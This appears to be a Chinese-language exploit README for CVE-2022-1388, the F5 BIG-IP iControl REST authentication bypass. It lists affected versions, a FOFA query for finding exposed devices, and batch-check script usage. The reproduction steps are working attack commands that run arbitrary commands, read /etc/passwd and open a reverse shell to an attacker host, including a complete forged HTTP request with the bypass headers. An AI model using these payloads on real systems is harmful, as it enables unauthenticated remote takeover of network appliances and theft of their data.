# 0x01 漏洞概述
F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。`iControl REST` 是iControl框架的演变，使用 REpresentational State Transfer (REST)。这允许用户或脚本与 F5 设备之间进行轻量级、快速的交互。

该漏洞允许未经身份验证的攻击者通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，以执行任意系统命令、创建或删除文件以及禁用BIG-IP上的服务。

# 0x02 影响版本
该漏洞存在于 BIG-IP 使用的 iControl REST 框架中，BIG-IP存在漏洞的版本如下：
- 16.1.0 - 16.1.2
- 15.1.0 - 15.1.5
- 14.1.0 - 14.1.4
- 13.1.0 - 13.1.4
- 12.1.0 - 12.1.6
- 11.6.1 - 11.6.5

# 0x03 FOFA DORK
> title="BIG-IP&reg;-+Redirect" && "Server" && server=="Apache"

# 0X04 环境搭建
https://www.i4k.xyz/article/weixin_37569048/100052755

# 0x05 漏洞复现
🔗 [CVE-2022-1388-EXP](https://github.com/bytecaps/CVE-2022-1388-EXP)

## 5.1、访问F5 BIG-IP平台界面

![image](https://user-images.githubusercontent.com/84888757/167933484-d6a7c2de-fd98-4d13-87b6-c32166bfa645.png)

## 5.2、漏洞验证
根据POC，先访问URL：https://xx.xx.xx.xx/mgmt/shared/authn/login，若响应中存在resterrorresponse，则确认存在漏洞。

🚩 小坑：check.py批量验证有漏洞的url，有的无法执行命令，无法进行下一步利用。

```
单个检测：python3 check.py -u url
批量检测：python3 check.py -f url.txt
```
![image](https://user-images.githubusercontent.com/84888757/167929154-d58ab8b5-4af7-4902-abc7-d76b8937fccc.png)

![image](https://user-images.githubusercontent.com/84888757/167934086-89ecd430-ef85-4d6a-b74b-74dadf035392.png)


## 5.3、命令执行
```
默认执行id命令：python3 exp.py -a true -u https://xx.xx.xx.xx/
执行指定命令：python3 exp.py -a true -u https://xx.xx.xx.xx/ -c "cat /etc/passwd"
```
![image](https://user-images.githubusercontent.com/84888757/167930074-206ef05c-6830-4122-9d6d-84c2a53a3335.png)

反弹shell（使用exp.py）
```
python3 exp.py -a true -u https://目标ip/ -c "bash -i >& /dev/tcp/攻击机ip/port 0>&1"
```

反弹shell（使用burp）
```
POST /mgmt/tm/util/bash HTTP/1.1
Host: xx.xx.xx.xx
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Connection: keep-alive, x-F5-Auth-Token
X-F5-Auth-Token: a
Authorization: Basic YWRtaW46
Content-Length: 86

{"command": "run", "utilCmdArgs": "-c 'bash -i >& /dev/tcp/攻击机ip/1111 0>&1'"}
```

![image](https://user-images.githubusercontent.com/84888757/167932957-5889c145-ca81-4f19-b588-474e52bd762c.png)


# 0x06 参考链接
- https://mp.weixin.qq.com/s/VE0StMn_dZ8VyaxDw1nHag
- https://www.ddosi.org/cve-2022-1388/
